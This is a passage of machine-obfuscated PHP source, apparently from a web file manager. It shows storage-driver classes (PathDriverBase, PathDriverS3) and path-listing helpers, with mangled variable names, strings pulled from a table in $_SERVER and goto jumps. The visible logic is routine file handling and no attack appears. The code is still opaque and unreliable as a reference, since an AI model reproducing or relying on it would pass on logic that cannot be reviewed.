($°“÷¥‚à[$š¦Á©Ö¬[192]] == $£Í¸´Èã) { $°“÷¥‚à[$š¦Á©Ö¬[609]] = $š¦Á©Ö¬[618]; $°“÷¥‚à[$š¦Á©Ö¬[191]] = $š¦Á©Ö¬[239]; $°“÷¥‚à[$š¦Á©Ö¬[32]] = LNG($š¦Á©Ö¬[617]); } $°“÷¥‚à[$š¦Á©Ö¬[619]] = $š¦Á©Ö¬[620]; } protected function _listAppendPathRoot(&$ÕÛ‡Œ‚Ô, $ª¶à·) { $ßÉêâ =& $_SERVER[áäÒ½¯Ç]; static $ûä»ÕÈì = false; static $Ğï•Ëé¿ = false; $®ŞÍ¬¡› = $ßÉêâ[12]; if ($ÕÛ‡Œ‚Ô[$ßÉêâ[189]] == self::TYPE_USER) { if ($ÕÛ‡Œ‚Ô[$ßÉêâ[594]] == USER_ID) { $®ŞÍ¬¡› = LNG($ßÉêâ[621]); if ($ûä»ÕÈì === !1) { $Ü‡ùû› = Model($ßÉêâ[622])->getInfoFull(USER_ID); $ûä»ÕÈì = _get($Ü‡ùû›, $ßÉêâ[623], $ßÉêâ[12]); } if ($Ğï•Ëé¿ === !1) { $Ü‡ùû› = Model($ßÉêâ[622])->getInfoFull(USER_ID); $Ğï•Ëé¿ = _get($Ü‡ùû›, $ßÉêâ[624], $ßÉêâ[12]); } if ($ª¶à· && $ª¶à·[0] == $ûä»ÕÈì || !$ª¶à· && $ÕÛ‡Œ‚Ô[$ßÉêâ[192]] == $ûä»ÕÈì) { $®ŞÍ¬¡› = LNG($ßÉêâ[625]); $ÕÛ‡Œ‚Ô[$ßÉêâ[626]] = $ßÉêâ[627]; } if ($ª¶à· && $ª¶à·[0] == $Ğï•Ëé¿ || !$ª¶à· && $ÕÛ‡Œ‚Ô[$ßÉêâ[192]] == $Ğï•Ëé¿) { $®ŞÍ¬¡› = $®ŞÍ¬¡› . $ßÉêâ[628] . LNG($ßÉêâ[629]); } if (!$ª¶à·) { $ÕÛ‡Œ‚Ô[$ßÉêâ[32]] = $®ŞÍ¬¡›; } } else { $Ü‡ùû› = Model($ßÉêâ[622])->getInfoFull($ÕÛ‡Œ‚Ô[$ßÉêâ[594]]); $–Ê ¤ê€ = _get($Ü‡ùû›, $ßÉêâ[624], $ßÉêâ[12]); $ÕÛ‡Œ‚Ô[$ßÉêâ[630]] = Model($ßÉêâ[602])->getInfoSimpleOuter($ÕÛ‡Œ‚Ô[$ßÉêâ[594]]); $®ŞÍ¬¡› = LNG($ßÉêâ[631]) . $ßÉêâ[174] . $ÕÛ‡Œ‚Ô[$ßÉêâ[630]][$ßÉêâ[32]] . $ßÉêâ[176]; if ($ª¶à· && $ª¶à·[0] == $–Ê ¤ê€ || !$ª¶à· && $ÕÛ‡Œ‚Ô[$ßÉêâ[192]] == $–Ê ¤ê€) { $®ŞÍ¬¡› = LNG($ßÉêâ[631]) . $ßÉêâ[632] . $ÕÛ‡Œ‚Ô[$ßÉêâ[630]][$ßÉêâ[32]] . $ßÉêâ[628] . LNG($ßÉêâ[629]) . $ßÉêâ[176]; } } } else { if ($ÕÛ‡Œ‚Ô[$ßÉêâ[189]] == self::TYPE_GROUP) { $“Ìğ”÷ö = Model($ßÉêâ[610])->getInfoSimple($ÕÛ‡Œ‚Ô[$ßÉêâ[594]]); $®ŞÍ¬¡› = $“Ìğ”÷ö[$ßÉêâ[32]]; } else { if ($ÕÛ‡Œ‚Ô[$ßÉêâ[189]] == self::TYPE_SYSTEM) { $®ŞÍ¬¡› = $ßÉêâ[633]; } } } $®ŞÍ¬¡› = $®ŞÍ¬¡› ? $ßÉêâ[8] . $®ŞÍ¬¡› . $ßÉêâ[8] : $ßÉêâ[8]; return $®ŞÍ¬¡›; } protected function _listAppendUser(&$Ûòë¾Õ) { $ÏÑ¤ï™“ =& $_SERVER[áäÒ½¯Ç]; $¿íãÎÔ˜ = array_to_keyvalue($Ûòë¾Õ, $ÏÑ¤ï™“[12], $ÏÑ¤ï™“[546]); $€ ×›Ÿ = array_to_keyvalue($Ûòë¾Õ, $ÏÑ¤ï™“[12], $ÏÑ¤ï™“[548]); $îâëí” = array_merge($¿íãÎÔ˜, $€ ×›Ÿ); $À­Õ‘½ = Model($ÏÑ¤ï™“[622])->userListInfo($îâëí”); foreach ($Ûòë¾Õ as &$è¹·ù·) { $ãÂïóôå = $è¹·ù·[$ÏÑ¤ï™“[546]]; $è¹·ù·[$ÏÑ¤ï™“[546]] = $À­Õ‘½[$ãÂïóôå] ? $À­Õ‘½[$ãÂïóôå] : !1; $ãÂïóôå = $è¹·ù·[$ÏÑ¤ï™“[548]]; $è¹·ù·[$ÏÑ¤ï™“[548]] = $À­Õ‘½[$ãÂïóôå] ? $À­Õ‘½[$ãÂïóôå] : !1; if (_get($è¹·ù·, $ÏÑ¤ï™“[634], 0)) { $Éâ ÇŠ© = $GLOBALS[$ÏÑ¤ï™“[6]][$ÏÑ¤ï™“[92]][$ÏÑ¤ï™“[635]]; if ($è¹·ù·[$ÏÑ¤ï™“[560]][$ÏÑ¤ï™“[636]] <= time() - $Éâ ÇŠ©) { $this->metaSet($è¹·ù·[$ÏÑ¤ï™“[192]], $ÏÑ¤ï™“[637], null); $this->metaSet($è¹·ù·[$ÏÑ¤ï™“[192]], $ÏÑ¤ï™“[636], null); unset($è¹·ù·[$ÏÑ¤ï™“[560]][$ÏÑ¤ï™“[637]]); continue; } $öÍÜŞÀ¡ = $è¹·ù·[$ÏÑ¤ï™“[560]][$ÏÑ¤ï™“[637]]; $è¹·ù·[$ÏÑ¤ï™“[560]][$ÏÑ¤ï™“[638]] = Model($ÏÑ¤ï™“[622])->getInfoSimpleOuter($öÍÜŞÀ¡); } } unset($è¹·ù·); } public function parentLevelArray($¯¿»Ÿ®Â) { $Êûµø‡ƒ =& $_SERVER[áäÒ½¯Ç]; $¯¿»Ÿ®Â = explode($Êûµø‡ƒ[50], trim($¯¿»Ÿ®Â, $Êûµø‡ƒ[50])); return array_to_int(array_filter($¯¿»Ÿ®Â)); } public function listAll($´¬Œ¾äè) { $à³ğÏÔ÷ =& $_SERVER[áäÒ½¯Ç]; $›û¡µÛ = $this->sourceInfo($´¬Œ¾äè); $²öÏ–ô = array($à³ğÏÔ÷[639] => array($à³ğÏÔ÷[640], $›û¡µÛ[$à³ğÏÔ÷[609]] . $´¬Œ¾äè . $à³ğÏÔ÷[641]), $à³ğÏÔ÷[642] => 0); $†Èòª¿ˆ = $à³ğÏÔ÷[643]; $ÜØ÷†²¥ = "\x4c\x45\106\x54\x20\x4a\117\x49\x4e\40{$this->tablePrefix}\x69\x6f\x5f\x66\151\154\145\x20\146\151\x6c\x65\x20\x6f\156\x20\163\x6f\x75\x72\143\x65\x2e\146\x69\x6c\145\111\x44\x20\75\x20\146\x69\154\x65\x2e\x66\x69\x6c\x65\111\104"; $Ş¬–à° = $this->alias($à³ğÏÔ÷[538])->field($†Èòª¿ˆ)->where($²öÏ–ô)->join($ÜØ÷†²¥)->select(); $this->_listAppendAuth($Ş¬–à°); $this->_listAppendUser($Ş¬–à°); $this->_listAppendPath($Ş¬–à°); $Ş¬–à° = array_to_keyvalue($Ş¬–à°, $à³ğÏÔ÷[192]); $ü‡íà”½ = "\x2f{$›û¡µÛ[$à³ğÏÔ÷[32]]}\57"; $ü‡íà”½ = $ü‡íà”½ == $à³ğÏÔ÷[265] ? $à³ğÏÔ÷[8] : $ü‡íà”½; $§ûÏëÁÈ = array(); foreach ($Ş¬–à° as $åíîñ©ô => $İºö¨Òö) { $€ã‚ŒÎâ = $this->parentLevelArray($İºö¨Òö[$à³ğÏÔ÷[609]]); array_shift($€ã‚ŒÎâ); $ÉÚü›îŠ = $ü‡íà”½; for ($ÓƒÔà„Ê = 0; $ÓƒÔà„Ê < count($€ã‚ŒÎâ); $ÓƒÔà„Ê++) { $ÉÚü›îŠ .= $Ş¬–à°[$€ã‚ŒÎâ[$ÓƒÔà„Ê]][$à³ğÏÔ÷[32]] . $à³ğÏÔ÷[8]; } $ÉÚü›îŠ .= $İºö¨Òö[$à³ğÏÔ÷[32]]; if ($İºö¨Òö[$à³ğÏÔ÷[505]]) { $ÉÚü›îŠ .= $à³ğÏÔ÷[8]; } $÷úîÈÀ¢ = array($à³ğÏÔ÷[515] => str_replace($à³ğÏÔ÷[265], $à³ğÏÔ÷[8], str_replace($à³ğÏÔ÷[265], $à³ğÏÔ÷[8], str_replace($à³ğÏÔ÷[265], $à³ğÏÔ÷[8], $ÉÚü›îŠ))), $à³ğÏÔ÷[644] => intval($İºö¨Òö[$à³ğÏÔ÷[505]]), $à³ğÏÔ÷[645] => intval($İºö¨Òö[$à³ğÏÔ÷[79]]), $à³ğÏÔ÷[88] => intval($İºö¨Òö[$à³ğÏÔ÷[88]]), $à³ğÏÔ÷[90] => $this->pathInfoFilter($İºö¨Òö)); if (!$÷úîÈÀ¢[$à³ğÏÔ÷[505]]) { $÷úîÈÀ¢[$à³ğÏÔ÷[562]] = $İºö¨Òö[$à³ğÏÔ÷[562]]; } $§ûÏëÁÈ[] = $÷úîÈÀ¢; } $§ûÏëÁÈ = array_sort_by($§ûÏëÁÈ, $à³ğÏÔ÷[87]); return $§ûÏëÁÈ; } } goto fŸÅ‘™ğ˜Î; dÃ™ÇäŸˆÄ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($÷ÇÒ—ªš) { $ğÖÖÒ =& $_SERVER[áäÒ½¯Ç]; parent::__construct($÷ÇÒ—ªš); $÷˜Æ¼ = isset($÷ÇÒ—ªš[$ğÖÖÒ[267]]) && $÷ÇÒ—ªš[$ğÖÖÒ[267]] == $ğÖÖÒ[258] ? $ğÖÖÒ[258] : $ğÖÖÒ[323]; $this->setSignVersion($÷˜Æ¼); } public function link($¢Å¬‰ßû, $ïª†òÙ” = array()) { return parent::link($¢Å¬‰ßû, $ïª†òÙ”); } public function fileOut($ßóÙé¢‡, $şÄ§£·í = false, $×‚Âóû = false, $àÑŞûîÆ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[áäÒ½¯Ç][324])) { return parent::fileOutServer($ßóÙé¢‡, $şÄ§£·í, $×‚Âóû, $àÑŞûîÆ); } parent::fileOut($ßóÙé¢‡, $şÄ§£·í, $×‚Âóû, $àÑŞûîÆ); } public function fileOutImage($Ò¿©·ÃÒ, $¾¢®ÆÑÒ = 250) { if (strstr($this->endpoint, $_SERVER[áäÒ½¯Ç][324])) { return parent::fileOutImageServer($Ò¿©·ÃÒ, $¾¢®ÆÑÒ); } parent::fileOutImage($Ò¿©·ÃÒ, $¾¢®ÆÑÒ); } } define($_SERVER[áäÒ½¯Ç][325], 1); define($_SERVER[áäÒ½¯Ç][326], 2); goto c±ÙÁ‡Ÿ¸ê; dÛÔËŸâ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $Á¡ÂÇæ¨ =& $_SERVER[áäÒ½¯Ç]; $this->objectDriver = array($Á¡ÂÇæ¨[60], $Á¡ÂÇæ¨[61], $Á¡ÂÇæ¨[62], $Á¡ÂÇæ¨[63], $Á¡ÂÇæ¨[64], $Á¡ÂÇæ¨[65], $Á¡ÂÇæ¨[66], $Á¡ÂÇæ¨[67], $Á¡ÂÇæ¨[68], $Á¡ÂÇæ¨[69], $Á¡ÂÇæ¨[70], $Á¡ÂÇæ¨[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ã€†£ı¶) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ã€†£ı¶, $_SERVER[áäÒ½¯Ç][8]); } return $ã€†£ı¶; } public function iconvApp($µ°ç°®£) { return $µ°ç°®£; } public function iconvSystem($¸Ú¿½àÇ) { return $¸Ú¿½àÇ; } public function iconvTo($İßŒ™Üœ, $È¨ÓÃşß, $°€ë­›°) { $ãóÊƒ³† =& $_SERVER[áäÒ½¯Ç]; if (!$İßŒ™Üœ || !function_exists($ãóÊƒ³†[72])) { return $İßŒ™Üœ; } static $ƒ€òİç  = array(); $á¼¨¥üğ = $È¨ÓÃşß . $ãóÊƒ³†[73] . $°€ë­›° . $ãóÊƒ³†[74] . $İßŒ™Üœ; if (isset($ƒ€òİç [$á¼¨¥üğ])) { return $ƒ€òİç [$á¼¨¥üğ]; } if (function_exists($ãóÊƒ³†[75])) { $½·¶öÛ… = @mb_convert_encoding($İßŒ™Üœ, $°€ë­›°, $È¨ÓÃşß); } else { $½·¶öÛ… = @iconv($È¨ÓÃşß, $°€ë­›°, $İßŒ™Üœ); } $½·¶öÛ… = $½·¶öÛ… ? $½·¶öÛ… : $İßŒ™Üœ; if (strstr($½·¶öÛ…, $ãóÊƒ³†[76])) { $½·¶öÛ… = str_replace($ãóÊƒ³†[76], $ãóÊƒ³†[11], $½·¶öÛ…); } $ƒ€òİç [$È¨ÓÃşß . $ãóÊƒ³†[73] . $°€ë­›° . $ãóÊƒ³†[74] . $İßŒ™Üœ] = $½·¶öÛ…; $ƒ€òİç [$°€ë­›° . $ãóÊƒ³†[73] . $È¨ÓÃşß . $ãóÊƒ³†[74] . $İßŒ™Üœ] = $İßŒ™Üœ; $ƒ€òİç [$°€ë­›° . $ãóÊƒ³†[73] . $È¨ÓÃşß . $ãóÊƒ³†[74] . $½·¶öÛ…] = $İßŒ™Üœ; $ƒ€òİç [$È¨ÓÃşß . $ãóÊƒ³†[73] . $°€ë­›° . $ãóÊƒ³†[74] . $½·¶öÛ…] = $½·¶öÛ…; return $½·¶öÛ…; } public function getPathInner($üëƒˆí¸) { $¦—æÊç¥ = IO::init($üëƒˆí¸); return $¦—æÊç¥->path; } public function getPathOuter($õ»Ïğ Û) { $ßÒŒšîª =& $_SERVER[áäÒ½¯Ç]; $ÎÍ„ÇÅÇ = strlen(trim($this->pathBase, $ßÒŒšîª[8])); $õ»Ïğ Û = substr(trim($õ»Ïğ Û, $ßÒŒšîª[8]), $ÎÍ„ÇÅÇ); return $this->pathDriver . $ßÒŒšîª[8] . ltrim($õ»Ïğ Û, $ßÒŒšîª[8]); } public function isParentOf($Í¬¨¿ªŒ, $ÓŒÔéÛ‡) { $ó·ä«À =& $_SERVER[áäÒ½¯Ç]; $Í¬¨¿ªŒ = rtrim(strtolower($Í¬¨¿ªŒ), $ó·ä«À[8]) . $ó·ä«À[8]; $ÓŒÔéÛ‡ = rtrim(strtolower($ÓŒÔéÛ‡), $ó·ä«À[8]) . $ó·ä«À[8]; $úâ¦Í‘¶ = strpos($ÓŒÔéÛ‡, $Í¬¨¿ªŒ) === 0; return $úâ¦Í‘¶; } public function getType() { $Üñ¡¼Æ¤ =& $_SERVER[áäÒ½¯Ç]; $ïÁÔÈòê = str_replace($Üñ¡¼Æ¤[77], $Üñ¡¼Æ¤[12], get_class($this)); return strtolower($ïÁÔÈòê); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($…¨ÑáÇË, $’¶ê‚Áö) { $œ—±ÌŞ¼ =& $_SERVER[áäÒ½¯Ç]; $±Ñ‰Çİ¨ = rtrim($…¨ÑáÇË, $œ—±ÌŞ¼[8]) . $œ—±ÌŞ¼[8] . $’¶ê‚Áö; $Ş„ôÀòº = $this->exist($±Ñ‰Çİ¨); return $Ş„ôÀòº ? $±Ñ‰Çİ¨ : !1; } public function setModifyTime($¸ñÀšë, $•ØÚÑè = '') { } public function renameObject($ÚÉ¤¾Ëâ, $¨€Â‚áÀ) { $”»´”ú¿ = $¨€Â‚áÀ; $ÚÉ¤¾Ëâ = $this->getPathOuter($ÚÉ¤¾Ëâ); $¨€Â‚áÀ = $this->pathFather($ÚÉ¤¾Ëâ) . $¨€Â‚áÀ; $„¼ø¡Ğ˜ = IO::copy($ÚÉ¤¾Ëâ, $this->pathFather($ÚÉ¤¾Ëâ), REPEAT_RENAME_FOLDER, $”»´”ú¿); if ($„¼ø¡Ğ˜) { IO::remove($ÚÉ¤¾Ëâ); } return $„¼ø¡Ğ˜ ? $¨€Â‚áÀ : !1; } public function tempFile($ƒ³Êª·ó = '', $ÚÂÓô·· = '') { if (!$ƒ³Êª·ó) { $ƒ³Êª·ó = rand_string(15); } $Ô±¤«şœ = TEMP_FILES . rand_string(15) . $_SERVER[áäÒ½¯Ç][8]; @mkdir($Ô±¤«şœ, DEFAULT_PERRMISSIONS, !0); $‘·æş¬Æ = $Ô±¤«şœ . $ƒ³Êª·ó; @touch($‘·æş¬Æ); if ($ÚÂÓô··) { file_put_contents($‘·æş¬Æ, $ÚÂÓô··); } return $‘·æş¬Æ; } public function tempFileRemve($õÚ¥ãÛ¦) { @unlink($õÚ¥ãÛ¦); @rmdir($this->pathFather($õÚ¥ãÛ¦)); } public function mkfile($¦ğƒ©ûÈ, $ß§ª‘ş… = '', $÷¤õ–À = REPEAT_RENAME) { } public function mkdir($ñğº·½Ş, $ÊíË…•Ö = REPEAT_SKIP) { } public function delFile($ÏãŞ«éÓ) { } public function delFolder($Éè‰ã§ª) { } public function copyFile($—¿ÈÒìŒ, $§Ñ¸›ô¼) { } public function moveFile($Õ¥¡Ãª×, $šêï€¸Ş) { } public function remove($ÒÇ—“›Â) { if ($this->isFile($ÒÇ—“›Â)) { return $this->delFile($ÒÇ—“›Â); } return $this->delFolder($ÒÇ—“›Â); } public function rename($—•ü°Ä, $Ğî×ÔÉ) { } public function exist($š˜‡éş¥) { } public function isFile($öÁèô€Õ) { } public function isFolder($€ §«Õ¦) { } public function size($ğ“ù­¹å) { } public function info($Åİ€‘¦«) { } public function infoSimple($Ùı¶Îøï) { return $this->info($Ùı¶Îøï); } public function infoAuth($½ßØ·íÅ) { return $this->info($½ßØ·íÅ); } public function infoFull($á‘‰­¬´) { return $this->info($á‘‰­¬´); } public function infoFullSimple($Í€éÍëø) { return $this->info($Í€éÍëø); } public function infoWithChildren($Í½Ôùøç) { $£øĞïş =& $_SERVER[áäÒ½¯Ç]; static $¥¯Š·ò = array(); if (isset($¥¯Š·ò[$Í½Ôùøç])) { return $¥¯Š·ò[$Í½Ôùøç]; } $êĞû‡›  = $this->info($Í½Ôùøç); if ($êĞû‡›  && $êĞû‡› [$£øĞïş[33]] == $£øĞïş[78]) { $ä§Š€ìÚ = array($£øĞïş[79] => 0, $£øĞïş[80] => 0, $£øĞïş[81] => 0); $this->infoChildren($Í½Ôùøç, $ä§Š€ìÚ); $êĞû‡› [$£øĞïş[79]] = $ä§Š€ìÚ[$£øĞïş[79]]; $êĞû‡› [$£øĞïş[82]] = array($£øĞïş[83] => $ä§Š€ìÚ[$£øĞïş[80]], $£øĞïş[84] => $ä§Š€ìÚ[$£øĞïş[81]]); $¥¯Š·ò[$Í½Ôùøç] = $êĞû‡› ; } return $êĞû‡› ; } public function listPath($‚§É²¦Ñ, $Û»”Æ‰ = false) { } public function has($ ú¼Ú×ù, $Ë¥‹ñ¾ø = false, $ş‡™ç÷¬ = false) { } public function canRead($œ×Î¹ï«) { } public function canWrite($Ÿ…ı¤Ì) { } public function getContent($•ç•¥¤è) { } public function setContent($¢´³àüæ, $Õ«ªªËĞ = '') { } protected function infoChildren($Öö¨Èï£, &$ª‡éÔ«¼) { $Å£Å´ =& $_SERVER[áäÒ½¯Ç]; check_abort_echo(); $‰€”¡Ûª = $this->listPath($Öö¨Èï£, !0); $‰€”¡Ûª = array_merge($‰€”¡Ûª[$Å£Å´[85]], $‰€”¡Ûª[$Å£Å´[86]]); foreach ($‰€”¡Ûª as $­®Ìèà) { if ($­®Ìèà[$Å£Å´[33]] == $Å£Å´[78]) { $ª‡éÔ«¼[$Å£Å´[81]]++; $òä…ûÄ = $this->getPathInner($­®Ìèà[$Å£Å´[87]]); $this->infoChildren($òä…ûÄ, $ª‡éÔ«¼); } else { $ª‡éÔ«¼[$Å£Å´[80]]++; $ª‡éÔ«¼[$Å£Å´[79]] += $­®Ìèà[$Å£Å´[79]]; } } } public function fileSubstr($†´–à™™, $Ç™Ë©Ä, $¿Ğüøß¸) { } public function listAll($Ò¼×Õêö) { } public function listAllMake($àËşÙ’‰, &$Éš®±ËÈ) { $Ú”Šáƒ¨ =& $_SERVER[áäÒ½¯Ç]; check_abort_echo(); $§äúüœ = $this->listPath($àËşÙ’‰, !0); if (!$§äúüœ) { return; } $ÛÊÚ«•¿ = array_merge($§äúüœ[$Ú”Šáƒ¨[85]], $§äúüœ[$Ú”Šáƒ¨[86]]); foreach ($ÛÊÚ«•¿ as $Û…Ğ‚×Ê) { $ÄèôÔë¹ = $Û…Ğ‚×Ê[$Ú”Šáƒ¨[33]] == $Ú”Šáƒ¨[78]; $ÂÊàË¼€ = array($Ú”Šáƒ¨[87] => $Û…Ğ‚×Ê[$Ú”Šáƒ¨[87]], $Ú”Šáƒ¨[78] => $ÄèôÔë¹); if (isset($Û…Ğ‚×Ê[$Ú”Šáƒ¨[79]])) { $ÂÊàË¼€[$Ú”Šáƒ¨[79]] = $Û…Ğ‚×Ê[$Ú”Šáƒ¨[79]]; } if (isset($Û…Ğ‚×Ê[$Ú”Šáƒ¨[88]])) { $ÂÊàË¼€[$Ú”Šáƒ¨[88]] = $Û…Ğ‚×Ê[$Ú”Šáƒ¨[88]]; } if (!$ÄèôÔë¹) { $Éš®±ËÈ[] = $ÂÊàË¼€; continue; } $Éš®±ËÈ[] = $ÂÊàË¼€; $˜€»Š¥ = $Û…Ğ‚×Ê[$Ú”Šáƒ¨[87]]; $Û²ÖûÆé = $this->pathDriver; if (substr($Û…Ğ‚×Ê[$Ú”Šáƒ¨[87]], 0, strlen($Û²ÖûÆé)) == $Û²ÖûÆé) { $˜€»Š¥ = substr($˜€»Š¥, strlen($Û²ÖûÆé)); } $this->listAllMake($˜€»Š¥, $Éš®±ËÈ); } } public function listAllSimple($ÍœŸ†şç, $ê‹†Ç¦Ó = false) { $’Ï¢ã¾ = $this->listAll($ÍœŸ†şç); return $this->listAllSimpleMake($’Ï¢ã¾, $this->getPathOuter($ÍœŸ†şç), $ê‹†Ç¦Ó); } public function listAllSimpleMake($ò…šèá³, $ìÚ³Ã, $Îñ»Àğ¡) { $Ñœ¡öÄÄ =& $_SERVER[áäÒ½¯Ç]; $­ø«¿ = array(); $ìÚ³Ã = rtrim(get_path_father($ìÚ³Ã), $Ñœ¡öÄÄ[8]) . $Ñœ¡öÄÄ[8]; foreach ($ò…šèá³ as $‹ÊÚã¥¬) { $²Ã‰—ÛÌ = array($Ñœ¡öÄÄ[87] => $‹ÊÚã¥¬[$Ñœ¡öÄÄ[87]], $Ñœ¡öÄÄ[89] => $‹ÊÚã¥¬[$Ñœ¡öÄÄ[87]], $Ñœ¡öÄÄ[78] => $‹ÊÚã¥¬[$Ñœ¡öÄÄ[78]]); if (isset($‹ÊÚã¥¬[$Ñœ¡öÄÄ[79]]) && !$‹ÊÚã¥¬[$Ñœ¡öÄÄ[78]]) { $²Ã‰—ÛÌ[$Ñœ¡öÄÄ[79]] = $‹ÊÚã¥¬[$Ñœ¡öÄÄ[79]]; } if (isset($‹ÊÚã¥¬[$Ñœ¡öÄÄ[88]])) { $²Ã‰—ÛÌ[$Ñœ¡öÄÄ[88]] = $‹ÊÚã¥¬[$Ñœ¡öÄÄ[88]]; } if (is_array($‹ÊÚã¥¬[$Ñœ¡öÄÄ[90]])) { $²Ã‰—ÛÌ[$Ñœ¡öÄÄ[89]] = $‹ÊÚã¥¬[$Ñœ¡öÄÄ[90]][$Ñœ¡öÄÄ[87]]; $²Ã‰—ÛÌ[$Ñœ¡öÄÄ[79]] = $‹ÊÚã¥¬[$Ñœ¡öÄÄ[90]][$Ñœ¡öÄÄ[79]]; $²Ã‰—ÛÌ[$Ñœ¡öÄÄ[88]] = $‹ÊÚã¥¬[$Ñœ¡öÄÄ[90]][$Ñœ¡öÄÄ[88]]; } else { if (substr($‹ÊÚã¥¬[$Ñœ¡öÄÄ[87]], 0, strlen($ìÚ³Ã)) == $ìÚ³Ã) { $²Ã‰—ÛÌ[$Ñœ¡öÄÄ[87]] = substr($‹ÊÚã¥¬[$Ñœ¡öÄÄ[87]], strlen($ìÚ³Ã)); } } $ºÔÂ‰íİ = $‹ÊÚã¥¬[$Ñœ¡öÄÄ[78]] ? $Ñœ¡öÄÄ[8] : $Ñœ¡öÄÄ[12]; $²Ã‰—ÛÌ[$Ñœ¡öÄÄ[89]] = rtrim($²Ã‰—ÛÌ[$Ñœ¡öÄÄ[89]], $Ñœ¡öÄÄ[8]) . $ºÔÂ‰íİ; $²Ã‰—ÛÌ[$Ñœ¡öÄÄ[87]] = $Ñœ¡öÄÄ[8] . trim($²Ã‰—ÛÌ[$Ñœ¡öÄÄ[87]], $Ñœ¡öÄÄ[8]) . $ºÔÂ‰íİ; if (!$Îñ»Àğ¡) { $º•ˆ‚ı“ = explode($Ñœ¡öÄÄ[8], trim($²Ã‰—ÛÌ[$Ñœ¡öÄÄ[87]], $Ñœ¡öÄÄ[8])); $²Ã‰—ÛÌ[$Ñœ¡öÄÄ[87]] = $Ñœ¡öÄÄ[8] . implode($Ñœ¡öÄÄ[8], array_slice($º•ˆ‚ı“, 1)) . $ºÔÂ‰íİ; } $­ø«¿[] = $²Ã‰—ÛÌ; } return array_sort_by($­ø«¿, $Ñœ¡öÄÄ[87]); } public function upload($ ğòØÀ®, $á™‘¨´, $©çı”ù = false, $­×ş£§€ = REPEAT_REPLACE) { } public function uploadFileByID($Ÿ©‚ê¹Ô, $§ÉÑêì, $åÈÕÜ›) { } public function uploadFileByPath($¾£úÀú, $€ü°Ó «, $ØÙ¼ÙÓ¦ = array()) { } public function isUploadServer() { $Ÿ¹­îÄ“ =& $_SERVER[áäÒ½¯Ç]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Ÿ¹­îÄ“[91]) { return !0; } return $GLOBALS[$Ÿ¹­îÄ“[6]][$Ÿ¹­îÄ“[92]][$Ÿ¹­îÄ“[93]]; } public function isFileOutServer() { $ºåá£íÚ =& $_SERVER[áäÒ½¯Ç]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ºåá£íÚ[91]) { return !0; } return $GLOBALS[$ºåá£íÚ[6]][$ºåá£íÚ[92]][$ºåá£íÚ[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($êî÷¤“¼) { $ÜáäÆ° =& $_SERVER[áäÒ½¯Ç]; if (!$this->isCdnHost()) { return $êî÷¤“¼; } return str_replace(trim(get_url_root($êî÷¤“¼), $ÜáäÆ°[8]), trim($this->cdnHost, $ÜáäÆ°[8]), $êî÷¤“¼); } public function uploadLink($±áêş, $öœ‹É—å = 0) { $Œ­…„â÷ =& $_SERVER[áäÒ½¯Ç]; if ($this->isUploadServer()) { return; } $¢»–Ô– = $this->getType(); if (!in_array($¢»–Ô–, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $İÛßïÄ = 1024 * 1024 * 10; $Øµş™ô² = (!$öœ‹É—å ? 1 : ceil($öœ‹É—å / pow(1024, 3))) * 3600 * 4; if ($öœ‹É—å <= $İÛßïÄ) { $©Æ­áî× = $this->uploadFormData($±áêş, $Øµş™ô²); } else { $©Æ­áî× = $this->uploadMultiData($±áêş, $Øµş™ô²); } if ($©Æ­áî×) { $©Æ­áî×[$Œ­…„â÷[95]] = $±áêş; $©Æ­áî×[$Œ­…„â÷[96]] = $¢»–Ô–; } return $©Æ­áî×; } public function uploadFormData($áæ´¦ã‰, $âÖ…û¿† = 3600) { } public function uploadMultiData($ËëÛÈØÅ, $æÙî‘à = 3600) { } public function multiUploadFormData($–©÷Ê†—, $Ãş‰µ©ô = 3600) { return $this->uploadMultiData($–©÷Ê†—, $Ãş‰µ©ô); } public function download($¬»ß…œÄ, $ÇÊÈîµ™) { } public function ext($«…ËÓ) { $²áç»À =& $_SERVER[áäÒ½¯Ç]; if (strpos($«…ËÓ, $²áç»À[8]) === -1) { $€¦»…Ç‘ = $«…ËÓ; } else { $€¦»…Ç‘ = $this->pathThis($«…ËÓ); } $õ—Äá§ = $²áç»À[12]; if (strstr($€¦»…Ç‘, $²áç»À[10])) { $õ—Äá§ = substr($€¦»…Ç‘, strrpos($€¦»…Ç‘, $²áç»À[10]) + 1); $õ—Äá§ = strtolower($õ—Äá§); } if (strlen($õ—Äá§) > 3 && preg_match($²áç»À[97], $õ—Äá§, $­†é¹¿)) { $õ—Äá§ = $²áç»À[12]; } return $õ—Äá§; } public function pathThis($–Îò§ ù) { $³¹è—ºˆ =& $_SERVER[áäÒ½¯Ç]; $–Îò§ ù = str_replace($³¹è—ºˆ[98], $³¹è—ºˆ[8], rtrim($–Îò§ ù, $³¹è—ºˆ[8])); $°¾ÈñÇŒ = strrpos($–Îò§ ù, $³¹è—ºˆ[8]); if ($°¾ÈñÇŒ === !1) { return $–Îò§ ù; } return substr($–Îò§ ù, $°¾ÈñÇŒ + 1); } public function pathFather($ïÅØä¹Ó) { $áŒ­Ğ’¬ =& $_SERVER[áäÒ½¯Ç]; $ïÅØä¹Ó = str_replace($áŒ­Ğ’¬[98], $áŒ­Ğ’¬[8], rtrim($ïÅØä¹Ó, $áŒ­Ğ’¬[8])); $ ÖÃ–§À = strrpos($ïÅØä¹Ó, $áŒ­Ğ’¬[8]); if ($ ÖÃ–§À === !1) { return $áŒ­Ğ’¬[12]; } return substr($ïÅØä¹Ó, 0, $ ÖÃ–§À + 1); } public function hashSimple($ã’¾ÊüË) { $òÉ­Ç‹ =& $_SERVER[áäÒ½¯Ç]; if (!$ã’¾ÊüË) { return md5($òÉ­Ç‹[12]); } $…ÄÈ¥­ê = $this->size($ã’¾ÊüË); $õª‚’İÚ = 200; $ı–Æş«× = 50; if ($…ÄÈ¥­ê <= $õª‚’İÚ * 